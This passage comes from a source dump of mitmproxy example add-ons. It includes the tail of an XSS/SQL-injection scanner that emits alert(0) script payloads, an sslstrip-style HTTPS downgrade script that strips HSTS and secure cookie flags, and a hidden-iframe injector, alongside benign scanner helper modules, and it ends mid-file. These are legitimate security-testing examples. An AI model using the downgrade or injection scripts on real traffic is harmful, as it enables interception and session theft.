<script>PAYLOAD</script>\n            return XSSData(\n                request_URL,\n                injection_point,\n                \"</script><script>alert(0)</script><script>\",\n                match.decode(\"utf-8\"),\n            )\n        elif (\n            in_script_val and in_single_quotes and inject_single_quotes and inject_semi\n        ):  # e.g. <script>t='PAYLOAD';</script>\n            return XSSData(\n                request_URL, injection_point, \"';alert(0);g='\", match.decode(\"utf-8\")\n            )\n        elif (\n            in_script_val and in_double_quotes and inject_double_quotes and inject_semi\n        ):  # e.g. <script>t=\"PAYLOAD\";</script>\n            return XSSData(\n                request_URL, injection_point, '\";alert(0);g=\"', match.decode(\"utf-8\")\n            )\n        elif (\n            in_tag\n            and in_single_quotes\n            and inject_single_quotes\n            and inject_open_angle\n            and inject_close_angle\n            and inject_slash\n        ):\n            # e.g. <a href='PAYLOAD'>Test</a>\n            return XSSData(\n                request_URL,\n                injection_point,\n                \"'><script>alert(0)</script>\",\n                match.decode(\"utf-8\"),\n            )\n        elif (\n            in_tag\n            and in_double_quotes\n            and inject_double_quotes\n            and inject_open_angle\n            and inject_close_angle\n            and inject_slash\n        ):\n            # e.g. <a href=\"PAYLOAD\">Test</a>\n            return XSSData(\n                request_URL,\n                injection_point,\n                '\"><script>alert(0)</script>',\n                match.decode(\"utf-8\"),\n            )\n        elif (\n            in_tag\n            and not in_double_quotes\n            and not in_single_quotes\n            and inject_open_angle\n            and inject_close_angle\n            and inject_slash\n        ):\n            # e.g. <a href=PAYLOAD>Test</a>\n            return XSSData(\n                request_URL,\n                injection_point,\n                \"><script>alert(0)</script>\",\n                match.decode(\"utf-8\"),\n            )\n        elif inject_javascript_handler(\n            body.decode(\"utf-8\")\n        ):  # e.g. <html><a href=PAYLOAD>Test</a>\n            return XSSData(\n                request_URL,\n                injection_point,\n                \"Javascript:alert(0)\",\n                match.decode(\"utf-8\"),\n            )\n        elif (\n            in_tag and in_double_quotes and inject_double_quotes and inject_equals\n        ):  # e.g. <a href=\"PAYLOAD\">Test</a>\n            return XSSData(\n                request_URL,\n                injection_point,\n                '\" onmouseover=\"alert(0)\" t=\"',\n                match.decode(\"utf-8\"),\n            )\n        elif (\n            in_tag and in_single_quotes and inject_single_quotes and inject_equals\n        ):  # e.g. <a href='PAYLOAD'>Test</a>\n            return XSSData(\n                request_URL,\n                injection_point,\n                \"' onmouseover='alert(0)' t='\",\n                match.decode(\"utf-8\"),\n            )\n        elif (\n            in_tag and not in_single_quotes and not in_double_quotes and inject_equals\n        ):  # e.g. <a href=PAYLOAD>Test</a>\n            return XSSData(\n                request_URL,\n                injection_point,\n                \" onmouseover=alert(0) t=\",\n                match.decode(\"utf-8\"),\n            )\n        elif (\n            in_HTML_val\n            and not in_script_val\n            and inject_open_angle\n            and inject_close_angle\n            and inject_slash\n        ):  # e.g. <html>PAYLOAD</html>\n            return XSSData(\n                request_URL,\n                injection_point,\n                \"<script>alert(0)</script>\",\n                match.decode(\"utf-8\"),\n            )\n        else:\n            return None\n    return None\n\n\n# response is mitmproxy's entry point\ndef response(flow: http.HTTPFlow) -> None:\n    assert flow.response\n    cookies_dict = get_cookies(flow)\n    resp = flow.response.get_text(strict=False)\n    assert resp\n    # Example: http://xss.guru/unclaimedScriptTag.html\n    find_unclaimed_URLs(resp, flow.request.url)\n    results = test_end_of_URL_injection(resp, flow.request.url, cookies_dict)\n    log_XSS_data(results[0])\n    log_SQLi_data(results[1])\n    # Example: https://daviddworken.com/vulnerableReferer.php\n    results = test_referer_injection(resp, flow.request.url, cookies_dict)\n    log_XSS_data(results[0])\n    log_SQLi_data(results[1])\n    # Example: https://daviddworken.com/vulnerableUA.php\n    results = test_user_agent_injection(resp, flow.request.url, cookies_dict)\n    log_XSS_data(results[0])\n    log_SQLi_data(results[1])\n    if \"?\" in flow.request.url:\n        # Example: https://daviddworken.com/vulnerable.php?name=\n        results = test_query_injection(resp, flow.request.url, cookies_dict)\n        log_XSS_data(results[0])\n        log_SQLi_data(results[1])\n", "examples/contrib/http_manipulate_cookies.py": "\"\"\"\nThis script is an example of how to manipulate cookies both outgoing (requests)\nand ingoing (responses). In particular, this script inserts a cookie (specified\nin a json file) into every request (overwriting any existing cookie of the same\nname), and removes cookies from every response that have a certain set of names\nspecified in the variable (set) FILTER_COOKIES.\n\nUsage:\n\n    mitmproxy -s examples/contrib/http_manipulate_cookies.py\n\nNote:\n    this was created as a response to SO post:\n    https://stackoverflow.com/questions/55358072/cookie-manipulation-in-mitmproxy-requests-and-responses\n\n\"\"\"\n\nimport json\n\nfrom mitmproxy import http\n\nPATH_TO_COOKIES = \"./cookies.json\"  # insert your path to the cookie file here\nFILTER_COOKIES = {\n    \"mycookie\",\n    \"_ga\",\n}  # update this to the specific cookie names you want to remove\n# NOTE: use a set for lookup efficiency\n\n\n# -- Helper functions --\ndef load_json_cookies() -> list[dict[str, str | None]]:\n    \"\"\"\n    Load a particular json file containing a list of cookies.\n    \"\"\"\n    with open(PATH_TO_COOKIES) as f:\n        return json.load(f)\n\n\n# NOTE: or just hardcode the cookies as [{\"name\": \"\", \"value\": \"\"}]\n\n\ndef stringify_cookies(cookies: list[dict[str, str | None]]) -> str:\n    \"\"\"\n    Creates a cookie string from a list of cookie dicts.\n    \"\"\"\n    return \"; \".join(\n        [\n            f\"{c['name']}={c['value']}\"\n            if c.get(\"value\", None) is not None\n            else f\"{c['name']}\"\n            for c in cookies\n        ]\n    )\n\n\ndef parse_cookies(cookie_string: str) -> list[dict[str, str | None]]:\n    \"\"\"\n    Parses a cookie string into a list of cookie dicts.\n    \"\"\"\n    return [\n        {\"name\": g[0], \"value\": g[1]} if len(g) == 2 else {\"name\": g[0], \"value\": None}\n        for g in [\n            k.split(\"=\", 1) for k in [c.strip() for c in cookie_string.split(\";\")] if k\n        ]\n    ]\n\n\n# -- Main interception functionality --\ndef request(flow: http.HTTPFlow) -> None:\n    \"\"\"Add a specific set of cookies to every request.\"\"\"\n    # obtain any cookies from the request\n    _req_cookies_str = flow.request.headers.get(\"cookie\", \"\")\n    req_cookies = parse_cookies(_req_cookies_str)\n\n    # add our cookies to the original cookies from the request\n    all_cookies = req_cookies + load_json_cookies()\n    # NOTE: by adding it to the end we should overwrite any existing cookies\n    # of the same name but if you want to be more careful you can iterate over\n    # the req_cookies and remove the ones you want to overwrite first.\n\n    # modify the request with the combined cookies\n    flow.request.headers[\"cookie\"] = stringify_cookies(all_cookies)\n\n\ndef response(flow: http.HTTPFlow) -> None:\n    \"\"\"Remove a specific cookie from every response.\"\"\"\n    set_cookies_str = flow.response.headers.get_all(\"set-cookie\")\n    # NOTE: According to docs, for use with the \"Set-Cookie\" and \"Cookie\" headers, either use `Response.cookies` or see `Headers.get_all`.\n    set_cookies_str_modified: list[str] = []\n\n    if set_cookies_str:\n        for cookie in set_cookies_str:\n            resp_cookies = parse_cookies(cookie)\n\n            # remove the cookie we want to remove\n            resp_cookies = [c for c in resp_cookies if c[\"name\"] not in FILTER_COOKIES]\n\n            # append the modified cookies to the list that will change the requested cookies\n            set_cookies_str_modified.append(stringify_cookies(resp_cookies))\n\n        # modify the request with the combined cookies\n        flow.response.headers.set_all(\"set-cookie\", set_cookies_str_modified)\n", "examples/contrib/sslstrip.py": "\"\"\"\nThis script implements an sslstrip-like attack based on mitmproxy.\nhttps://moxie.org/software/sslstrip/\n\"\"\"\n\nimport re\nimport urllib.parse\n\nfrom mitmproxy import http\n\n# set of SSL/TLS capable hosts\nsecure_hosts: set[str] = set()\n\n\ndef request(flow: http.HTTPFlow) -> None:\n    flow.request.headers.pop(\"If-Modified-Since\", None)\n    flow.request.headers.pop(\"Cache-Control\", None)\n\n    # do not force https redirection\n    flow.request.headers.pop(\"Upgrade-Insecure-Requests\", None)\n\n    # proxy connections to SSL-enabled hosts\n    if flow.request.pretty_host in secure_hosts:\n        flow.request.scheme = \"https\"\n        flow.request.port = 443\n\n        # We need to update the request destination to whatever is specified in the host header:\n        # Having no TLS Server Name Indication from the client and just an IP address as request.host\n        # in transparent mode, TLS server name certificate validation would fail.\n        flow.request.host = flow.request.pretty_host\n\n\ndef response(flow: http.HTTPFlow) -> None:\n    assert flow.response\n    flow.response.headers.pop(\"Strict-Transport-Security\", None)\n    flow.response.headers.pop(\"Public-Key-Pins\", None)\n\n    # strip links in response body\n    flow.response.content = flow.response.content.replace(b\"https://\", b\"http://\")\n\n    # strip meta tag upgrade-insecure-requests in response body\n    csp_meta_tag_pattern = rb'<meta.*http-equiv=[\"\\']Content-Security-Policy[\\'\"].*upgrade-insecure-requests.*?>'\n    flow.response.content = re.sub(\n        csp_meta_tag_pattern, b\"\", flow.response.content, flags=re.IGNORECASE\n    )\n\n    # strip links in 'Location' header\n    if flow.response.headers.get(\"Location\", \"\").startswith(\"https://\"):\n        location = flow.response.headers[\"Location\"]\n        hostname = urllib.parse.urlparse(location).hostname\n        if hostname:\n            secure_hosts.add(hostname)\n        flow.response.headers[\"Location\"] = location.replace(\"https://\", \"http://\", 1)\n\n    # strip upgrade-insecure-requests in Content-Security-Policy header\n    csp_header = flow.response.headers.get(\"Content-Security-Policy\", \"\")\n    if re.search(\"upgrade-insecure-requests\", csp_header, flags=re.IGNORECASE):\n        csp = flow.response.headers[\"Content-Security-Policy\"]\n        new_header = re.sub(\n            r\"upgrade-insecure-requests[;\\s]*\", \"\", csp, flags=re.IGNORECASE\n        )\n        flow.response.headers[\"Content-Security-Policy\"] = new_header\n\n    # strip secure flag from 'Set-Cookie' headers\n    cookies = flow.response.headers.get_all(\"Set-Cookie\")\n    cookies = [re.sub(r\";\\s*secure\\s*\", \"\", s) for s in cookies]\n    flow.response.headers.set_all(\"Set-Cookie\", cookies)\n", "examples/contrib/modify_body_inject_iframe.py": "# (this script works best with --anticache)\nfrom bs4 import BeautifulSoup\n\nfrom mitmproxy import ctx\nfrom mitmproxy import http\n\n\nclass Injector:\n    def load(self, loader):\n        loader.add_option(\"iframe\", str, \"\", \"IFrame to inject\")\n\n    def response(self, flow: http.HTTPFlow) -> None:\n        if ctx.options.iframe:\n            html = BeautifulSoup(flow.response.content, \"html.parser\")\n            if html.body:\n                iframe = html.new_tag(\n                    \"iframe\", src=ctx.options.iframe, frameborder=0, height=0, width=0\n                )\n                html.body.insert(0, iframe)\n                flow.response.content = str(html).encode(\"utf8\")\n\n\naddons = [Injector()]\n", "examples/contrib/httpdump.py": "#!/usr/bin/env python\n# dump content to files based on a filter\n# usage: mitmdump -s httpdump.py \"~ts application/json\"\n#\n# options:\n#   - dumper_folder: content dump destination folder (default: ./httpdump)\n#   - open_browser: open integrated browser with proxy configured at start (default: true)\n#\n# remember to add your own mitmproxy authoritative certs in your browser/os!\n# certs docs: https://docs.mitmproxy.org/stable/concepts-certificates/\n# filter expressions docs: https://docs.mitmproxy.org/stable/concepts-filters/\nimport logging\nimport mimetypes\nimport os\nfrom pathlib import Path\n\nfrom mitmproxy import ctx\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\n\n\nclass HTTPDump:\n    def load(self, loader):\n        self.filter = ctx.options.dumper_filter\n\n        loader.add_option(\n            name=\"dumper_folder\",\n            typespec=str,\n            default=\"httpdump\",\n            help=\"content dump destination folder\",\n        )\n        loader.add_option(\n            name=\"open_browser\",\n            typespec=bool,\n            default=True,\n            help=\"open integrated browser at start\",\n        )\n\n    def running(self):\n        if ctx.options.open_browser:\n            ctx.master.commands.call(\"browser.start\")\n\n    def configure(self, updated):\n        if \"dumper_filter\" in updated:\n            self.filter = ctx.options.dumper_filter\n\n    def response(self, flow: http.HTTPFlow) -> None:\n        if flowfilter.match(self.filter, flow):\n            self.dump(flow)\n\n    def dump(self, flow: http.HTTPFlow):\n        if not flow.response:\n            return\n\n        # create dir\n        folder = Path(ctx.options.dumper_folder) / flow.request.host\n        if not folder.exists():\n            os.makedirs(folder)\n\n        # calculate path\n        path = \"-\".join(flow.request.path_components)\n        filename = \"-\".join([path, flow.id])\n        content_type = flow.response.headers.get(\"content-type\", \"\").split(\";\")[0]\n        ext = mimetypes.guess_extension(content_type) or \"\"\n        filepath = folder / f\"{filename}{ext}\"\n\n        # dump to file\n        if flow.response.content:\n            with open(filepath, \"wb\") as f:\n                f.write(flow.response.content)\n            logging.info(f\"Saved! {filepath}\")\n\n\naddons = [HTTPDump()]\n", "examples/contrib/webscanner_helper/urlindex.py": "import abc\nimport datetime\nimport json\nimport logging\nfrom pathlib import Path\n\nfrom mitmproxy import flowfilter\nfrom mitmproxy.http import HTTPFlow\n\nlogger = logging.getLogger(__name__)\n\n\nclass UrlIndexWriter(abc.ABC):\n    \"\"\"Abstract Add-on to write seen URLs.\n\n    For example, these URLs can be injected in a web application to improve the crawling of web application scanners.\n    The injection can be done using the URLInjection Add-on.\n    \"\"\"\n\n    def __init__(self, filename: Path):\n        \"\"\"Initializes the UrlIndexWriter.\n\n        Args:\n            filename: Path to file to which the URL index will be written.\n        \"\"\"\n        self.filepath = filename\n\n    @abc.abstractmethod\n    def load(self):\n        \"\"\"Load existing URL index.\"\"\"\n\n    @abc.abstractmethod\n    def add_url(self, flow: HTTPFlow):\n        \"\"\"Add new URL to URL index.\"\"\"\n\n    @abc.abstractmethod\n    def save(self):\n        pass\n\n\nclass SetEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, set):\n            return list(obj)\n        return json.JSONEncoder.default(self, obj)\n\n\nclass JSONUrlIndexWriter(UrlIndexWriter):\n    \"\"\"Writes seen URLs as JSON.\"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.host_urls = {}\n\n    def load(self):\n        if self.filepath.exists():\n            with self.filepath.open(\"r\") as f:\n                self.host_urls = json.load(f)\n            for host in self.host_urls.keys():\n                for path, methods in self.host_urls[host].items():\n                    for method, codes in methods.items():\n                        self.host_urls[host][path] = {method: set(codes)}\n\n    def add_url(self, flow: HTTPFlow):\n        req = flow.request\n        res = flow.response\n\n        if req is not None and res is not None:\n            urls = self.host_urls.setdefault(\n                f\"{req.scheme}://{req.host}:{req.port}\", dict()\n            )\n            methods = urls.setdefault(req.path, {})\n            codes = methods.setdefault(req.method, set())\n            codes.add(res.status_code)\n\n    def save(self):\n        with self.filepath.open(\"w\") as f:\n            json.dump(self.host_urls, f, cls=SetEncoder)\n\n\nclass TextUrlIndexWriter(UrlIndexWriter):\n    \"\"\"Writes seen URLs as text.\"\"\"\n\n    def load(self):\n        pass\n\n    def add_url(self, flow: HTTPFlow):\n        res = flow.response\n        req = flow.request\n        if res is not None and req is not None:\n            with self.filepath.open(\"a+\") as f:\n                f.write(\n                    f\"{datetime.datetime.utcnow().isoformat()} STATUS: {res.status_code} METHOD: \"\n                    f\"{req.method} URL:{req.url}\\n\"\n                )\n\n    def save(self):\n        pass\n\n\nWRITER: dict[str, type[UrlIndexWriter]] = {\n    \"json\": JSONUrlIndexWriter,\n    \"text\": TextUrlIndexWriter,\n}\n\n\ndef filter_404(flow) -> bool:\n    \"\"\"Filters responses with status code 404.\"\"\"\n    return flow.response.status_code != 404\n\n\nclass UrlIndexAddon:\n    \"\"\"Add-on to write seen URLs, either as JSON or as text.\n\n    For example, these URLs can be injected in a web application to improve the crawling of web application scanners.\n    The injection can be done using the URLInjection Add-on.\n    \"\"\"\n\n    index_filter: str | flowfilter.TFilter | None\n    writer: UrlIndexWriter\n\n    OPT_FILEPATH = \"URLINDEX_FILEPATH\"\n    OPT_APPEND = \"URLINDEX_APPEND\"\n    OPT_INDEX_FILTER = \"URLINDEX_FILTER\"\n\n    def __init__(\n        self,\n        file_path: str | Path,\n        append: bool = True,\n        index_filter: str | flowfilter.TFilter = filter_404,\n        index_format: str = \"json\",\n    ):\n        \"\"\"Initializes the urlindex add-on.\n\n        Args:\n            file_path: Path to file to which the URL index will be written. Can either be given as str or Path.\n            append: Bool to decide whether to append new URLs to the given file (as opposed to overwrite the contents\n                of the file)\n            index_filer: A mitmproxy filter with which the seen URLs will be filtered before being written. Can either\n                be given as str or as flowfilter.TFilter\n            index_format: The format of the URL index, can either be \"json\" or \"text\".\n        \"\"\"\n\n        if isinstance(index_filter, str):\n            self.index_filter = flowfilter.parse(index_filter)\n            if self.index_filter is None:\n                raise ValueError(\"Invalid filter expression.\")\n        else:\n            self.index_filter = index_filter\n\n        file_path = Path(file_path)\n        try:\n            self.writer = WRITER[index_format.lower()](file_path)\n        except KeyError:\n            raise ValueError(f\"Format '{index_format}' is not supported.\")\n\n        if not append and file_path.exists():\n            file_path.unlink()\n\n        self.writer.load()\n\n    def response(self, flow: HTTPFlow):\n        \"\"\"Checks if the response should be included in the URL based on the index_filter and adds it to the URL index\n        if appropriate.\n        \"\"\"\n        if isinstance(self.index_filter, str) or self.index_filter is None:\n            raise ValueError(\"Invalid filter expression.\")\n        else:\n            if self.index_filter(flow):\n                self.writer.add_url(flow)\n\n    def done(self):\n        \"\"\"Writes the URL index.\"\"\"\n        self.writer.save()\n", "examples/contrib/webscanner_helper/watchdog.py": "import logging\nimport pathlib\nimport time\nfrom datetime import datetime\n\nimport mitmproxy.connections\nimport mitmproxy.http\nfrom mitmproxy.addons.export import curl_command\nfrom mitmproxy.addons.export import raw\nfrom mitmproxy.exceptions import HttpSyntaxException\n\nlogger = logging.getLogger(__name__)\n\n\nclass WatchdogAddon:\n    \"\"\"The Watchdog Add-on can be used in combination with web application scanners in oder to check if the device\n        under test responds correctls to the scanner's responses.\n\n    The Watchdog Add-on checks if the device under test responds correctly to the scanner's responses.\n    If the Watchdog sees that the DUT is no longer responding correctly, an multiprocessing event is set.\n    This information can be used to restart the device under test if necessary.\n    \"\"\"\n\n    def __init__(self, event, outdir: pathlib.Path, timeout=None):\n        \"\"\"Initializes the Watchdog.\n\n        Args:\n            event: multiprocessing.Event that will be set if the watchdog is triggered.\n            outdir: path to a directory in which the triggering requests will be saved (curl and raw).\n            timeout_conn: float that specifies the timeout for the server connection\n        \"\"\"\n        self.error_event = event\n        self.flow_dir = outdir\n        if self.flow_dir.exists() and not self.flow_dir.is_dir():\n            raise RuntimeError(\"Watchtdog output path must be a directory.\")\n        elif not self.flow_dir.exists():\n            self.flow_dir.mkdir(parents=True)\n        self.last_trigger: None | float = None\n        self.timeout: None | float = timeout\n\n    def serverconnect(self, conn: mitmproxy.connections.ServerConnection):\n        if self.timeout is not None:\n            conn.settimeout(self.timeout)\n\n    @classmethod\n    def not_in_timeout(cls, last_triggered, timeout):\n        \"\"\"Checks if current error lies not in timeout after last trigger (potential reset of connection).\"\"\"\n        return (\n            last_triggered is None\n            or timeout is None\n            or (time.time() - last_triggered > timeout)\n        )\n\n    def error(self, flow):\n        \"\"\"Checks if the watchdog will be triggered.\n\n        Only triggers watchdog for timeouts after last reset and if flow.error is set (shows that error is a server\n        error). Ignores HttpSyntaxException Errors since this can be triggered on purpose by web application scanner.\n\n        Args:\n            flow: mitmproxy.http.flow\n        \"\"\"\n        if (\n            self.not_in_timeout(self.last_trigger, self.timeout)\n            and flow.error is not None\n            and not isinstance(flow.error, HttpSyntaxException)\n        ):\n            self.last_trigger = time.time()\n            logger.error(f\"Watchdog triggered! Cause: {flow}\")\n            self.error_event.set()\n\n            # save the request which might have caused the problem\n            if flow.request:\n                with (self.flow_dir / f\"{datetime.utcnow().isoformat()}.curl\").open(\n                    \"w\"\n                ) as f:\n                    f.write(curl_command(flow))\n                with (self.flow_dir / f\"{datetime.utcnow().isoformat()}.raw\").open(\n                    \"wb\"\n                ) as f:\n                    f.write(raw(flow))\n", "examples/contrib/webscanner_helper/proxyauth_selenium.py": "import abc\nimport logging\nimport random\nimport string\nimport time\nfrom typing import Any\nfrom typing import cast\n\nfrom selenium import webdriver\n\nimport mitmproxy.http\nfrom mitmproxy import flowfilter\nfrom mitmproxy import master\nfrom mitmproxy.script import concurrent\n\nlogger = logging.getLogger(__name__)\n\ncookie_key_name = {\n    \"path\": \"Path\",\n    \"expires\": \"Expires\",\n    \"domain\": \"Domain\",\n    \"is_http_only\": \"HttpOnly\",\n    \"is_secure\": \"Secure\",\n}\n\n\ndef randomString(string_length=10):\n    \"\"\"Generate a random string of fixed length\"\"\"\n    letters = string.ascii_lowercase\n    return \"\".join(random.choice(letters) for i in range(string_length))\n\n\nclass AuthorizationOracle(abc.ABC):\n    \"\"\"Abstract class for an authorization oracle which decides if a given request or response is authenticated.\"\"\"\n\n    @abc.abstractmethod\n    def is_unauthorized_request(self, flow: mitmproxy.http.HTTPFlow) -> bool:\n        pass\n\n    @abc.abstractmethod\n    def is_unauthorized_response(self, flow: mitmproxy.http.HTTPFlow) -> bool:\n        pass\n\n\nclass SeleniumAddon:\n    \"\"\"This Addon can be used in combination with web application scanners in order to help them to authenticate\n    against a web application.\n\n    Since the authentication is highly dependant on the web application, this add-on includes the abstract method\n    *login*. In order to use the add-on, a class for the web application inheriting from SeleniumAddon needs to be\n    created. This class needs to include the concrete selenium actions necessary to authenticate against the web\n    application. In addition, an authentication oracle which inherits from AuthorizationOracle should be created.\n    \"\"\"\n\n    def __init__(self, fltr: str, domain: str, auth_oracle: AuthorizationOracle):\n        self.filter = flowfilter.parse(fltr)\n        self.auth_oracle = auth_oracle\n        self.domain = domain\n        self.browser = None\n        self.set_cookies = False\n\n        options = webdriver.FirefoxOptions()\n        options.headless = True\n\n        profile = webdriver.FirefoxProfile()\n        profile.set_preference(\"network.proxy.type\", 0)\n        self.browser = webdriver.Firefox(firefox_profile=profile, options=options)\n        self.cookies: list[dict[str, str]] = []\n\n    def _login(self, flow):\n        self.cookies = self.login(flow)\n        self.browser.get(\"about:blank\")\n        self._set_request_cookies(flow)\n        self.set_cookies = True\n\n    def request(self, flow: mitmproxy.http.HTTPFlow):\n        if flow.request.is_replay:\n            logger.warning(\"Caught replayed request: \" + str(flow))\n        if (\n            not self.filter or self.filter(flow)\n        ) and self.auth_oracle.is_unauthorized_request(flow):\n            logger.debug(\"unauthorized request detected, perform login\")\n            self._login(flow)\n\n    # has to be concurrent because replay.client is blocking and replayed flows\n    # will also call response\n    @concurrent\n    def response(self, flow: mitmproxy.http.HTTPFlow):\n        if flow.response and (self.filter is None or self.filter(flow)):\n            if self.auth_oracle.is_unauthorized_response(flow):\n                self._login(flow)\n                new_flow = flow.copy()\n                if master and hasattr(master, \"commands\"):\n                    # cast necessary for mypy\n                    cast(Any, master).commands.call(\"replay.client\", [new_flow])\n                    count = 0\n                    while new_flow.response is None and count < 10:\n                        logger.error(\"waiting since \" + str(count) + \" ...\")\n                        count = count + 1\n                        time.sleep(1)\n                    if new_flow.response:\n                        flow.response = new_flow.response\n                else:\n                    logger.warning(\n                        \"Could not call 'replay.client' command since master was not initialized yet.\"\n                    )\n\n            if self.set_cookies and flow.response:\n                logger.debug(\"set set-cookie header for response\")\n                self._set_set_cookie_headers(flow)\n                self.set_cookies = False\n\n    def done(self):\n        self.browser.close()\n\n    def _set_set_cookie_headers(self, flow: mitmproxy.http.HTTPFlow):\n        if flow.response and self.cookies:\n            for cookie in self.cookies:\n                parts = [f\"{cookie['name']}={cookie['value']}\"]\n                for k, v in cookie_key_name.items():\n                    if k in cookie and isinstance(cookie[k], str):\n                        parts.append(f\"{v}={cookie[k]}\")\n                    elif k in cookie and isinstance(cookie[k], bool) and cookie[k]:\n                        parts.append(cookie[k])\n                encoded_c = \"; \".join(parts)\n                flow.response.headers[\"set-cookie\"] = encoded_c\n\n    def _set_request_cookies(self, flow: mitmproxy.http.HTTPFlow):\n        if self.cookies:\n            cookies = \"; \".join(\n                map(lambda c: f\"{c['name']}={c['value']}\", self.cookies)\n            )\n            flow.request.headers[\"cookie\"] = cookies\n\n    @abc.abstractmethod\n    def login(self, flow: mitmproxy.http.HTTPFlow) -> list[dict[str, str]]:\n        pass\n", "examples/contrib/webscanner_helper/mapping.py": "import copy\nimport logging\n\nfrom bs4 import BeautifulSoup\n\nfrom examples.contrib.webscanner_helper.urldict import URLDict\nfrom mitmproxy.http import HTTPFlow\n\nNO_CONTENT = object()\n\n\nclass MappingAddonConfig:\n    HTML_PARSER = \"html.parser\"\n\n\nclass MappingAddon:\n    \"\"\"The mapping add-on can be used in combination with web application scanners to reduce their false positives.\n\n    Many web application scanners produce false positives caused by dynamically changing content of web applications\n    such as the current time or current measurements. When testing for injection vulnerabilities, web application\n    scanners are tricked into thinking they changed the content with the injected payload. In realty, the content of\n    the web application changed notwithstanding the scanner's input. When the mapping add-on is used to map the content\n    to a fixed value, these false positives can be avoided.\n    \"\"\"\n\n    OPT_MAPPING_FILE = \"mapping_file\"\n    \"\"\"File where urls and css selector to mapped content is stored.\n\n    Elements will be replaced with the content given in this file. If the content is none it will be set to the first\n    seen value.\n\n    Example:\n\n        {\n            \"http://10.10.10.10\": {\n                \"body\": \"My Text\"\n            },\n            \"URL\": {\n                \"css selector\": \"Replace with this\"\n            }\n        }\n    \"\"\"\n\n    OPT_MAP_PERSISTENT = \"map_persistent\"\n    \"\"\"Whether to store all new content in the configuration file.\"\"\"\n\n    def __init__(self, filename: str, persistent: bool = False) -> None:\n        \"\"\"Initializes the mapping add-on\n\n        Args:\n            filename: str that provides the name of the file in which the urls and css selectors to mapped content is\n                stored.\n            persistent: bool that indicates whether to store all new content in the configuration file.\n\n        Example:\n            The file in which the mapping config is given should be in the following format:\n            {\n                \"http://10.10.10.10\": {\n                    \"body\": \"My Text\"\n                },\n                \"<URL>\": {\n                    \"<css selector>\": \"Replace with this\"\n                }\n            }\n        \"\"\"\n        self.filename = filename\n        self.persistent = persistent\n        self.logger = logging.getLogger(self.__class__.__name__)\n        with open(filename) as f:\n            self.mapping_templates = URLDict.load(f)\n\n    def load(self, loader):\n        loader.add_option(\n            self.OPT_MAPPING_FILE,\n            str,\n            \"\",\n            \"File where replacement configuration is stored.\",\n        )\n        loader.add_option(\n            self.OPT_MAP_PERSISTENT,\n            bool,\n            False,\n            \"Whether to store all new content in the configuration file.\",\n        )\n\n    def configure(self, updated):\n        if self.OPT_MAPPING_FILE in updated:\n            self.filename = updated[self.OPT_MAPPING_FILE]\n            with open(self.filename) as f:\n                self.mapping_templates = URLDict.load(f)\n\n        if self.OPT_MAP_PERSISTENT in updated:\n            self.persistent = updated[self.OPT_MAP_PERSISTENT]\n\n    def replace(\n        self, soup: BeautifulSoup, css_sel: str, replace: BeautifulSoup\n    ) -> None:\n        \"\"\"Replaces the content of soup that matches the css selector with the given replace content.\"\"\"\n        for content in soup.select(css_sel):\n            self.logger.debug(f'replace \"{content}\" with \"{replace}\"')\n            content.replace_with(copy.copy(replace))\n\n    def apply_template(\n        self, soup: BeautifulSoup, template: dict[str, BeautifulSoup]\n    ) -> None:\n        \"\"\"Applies the given mapping template to the given soup.\"\"\"\n        for css_sel, replace in template.items():\n            mapped = soup.select(css_sel)\n            if not mapped:\n                self.logger.warning(\n                    f'Could not find \"{css_sel}\", can not freeze anything.'\n                )\n            else:\n                self.replace(\n                    soup,\n                    css_sel,\n                    BeautifulSoup(replace, features=MappingAddonConfig.HTML_PARSER),\n                )\n\n    def response(self, flow: HTTPFlow) -> None:\n        \"\"\"If a response is received, check if we should replace some content.\"\"\"\n        try:\n            templates = self.mapping_templates[flow]\n            res = flow.response\n            if res is not None:\n                encoding = res.headers.get(\"content-encoding\", \"utf-8\")\n                content_type = res.headers.get(\"content-type\", \"text/html\")\n\n                if \"text/html\" in content_type and encoding == \"utf-8\":\n                    content = BeautifulSoup(res.content, MappingAddonConfig.HTML_PARSER)\n                    for template in templates:\n                        self.apply_template(content, template)\n                    res.content = content.encode(encoding)\n                else:\n                    self.logger.warning(\n                        f\"Unsupported content type '{content_type}' or content encoding '{encoding}'\"\n                    )\n        except KeyError:\n            pass\n\n    def done(self) -> None:\n        \"\"\"Dumps all new content into the configuration file if self.persistent is set.\"\"\"\n        if self.persistent:\n            # make sure that all items are strings and not soups.\n            def value_dumper(value):\n                store = {}\n                if value is None:\n                    return \"None\"\n                try:\n                    for css_sel, soup in value.items():\n                        store[css_sel] = str(soup)\n                except Exception:\n                    raise RuntimeError(value)\n                return store\n\n            with open(self.filename, \"w\") as f:\n                self.mapping_templates.dump(f, value_dumper)\n", "examples/contrib/webscanner_helper/urldict.py": "import itertools\nimport json\nfrom collections.abc import Callable\nfrom collections.abc import Generator\nfrom collections.abc import MutableMapping\nfrom typing import Any\nfrom typing import cast\nfrom typing import TextIO\n\nfrom mitmproxy import flowfilter\nfrom mitmproxy.http import HTTPFlow\n\n\ndef f_id(x):\n    return x\n\n\nclass URLDict(MutableMapping):\n    \"\"\"Data structure to store information using filters as keys.\"\"\"\n\n    def __init__(self):\n        self.store: dict[flowfilter.TFilter, Any] = {}\n\n    def __getitem__(self, key, *, count=0):\n        if count:\n            ret = itertools.islice(self.get_generator(key), 0, count)\n        else:\n            ret = list(self.get_generator(key))\n\n        if ret:\n            return ret\n        else:\n            raise KeyError\n\n    def __setitem__(self, key: str, value):\n        fltr = flowfilter.parse(key)\n        if fltr:\n            self.store.__setitem__(fltr, value)\n        else:\n            raise ValueError(\"Not a valid filter\")\n\n    def __delitem__(self, key):\n        self.store.__delitem__(key)\n\n    def __iter__(self):\n        return self.store.__iter__()\n\n    def __len__(self):\n        return self.store.__len__()\n\n    def get_generator(self, flow: HTTPFlow) -> Generator[Any, None, None]:\n        for fltr, value in self.store.items():\n            if flowfilter.match(fltr, flow):\n                yield value\n\n    def get(self, flow: HTTPFlow, default=None, *, count=0) -> list[Any]:\n        try:\n            return self.__getitem__(flow, count=count)\n        except KeyError:\n            return default\n\n    @classmethod\n    def _load(cls, json_obj, value_loader: Callable = f_id):\n        url_dict = cls()\n        for fltr, value in json_obj.items():\n            url_dict[fltr] = value_loader(value)\n        return url_dict\n\n    @classmethod\n    def load(cls, f: TextIO, value_loader: Callable = f_id):\n        json_obj = json.load(f)\n        return cls._load(json_obj, value_loader)\n\n    @classmethod\n    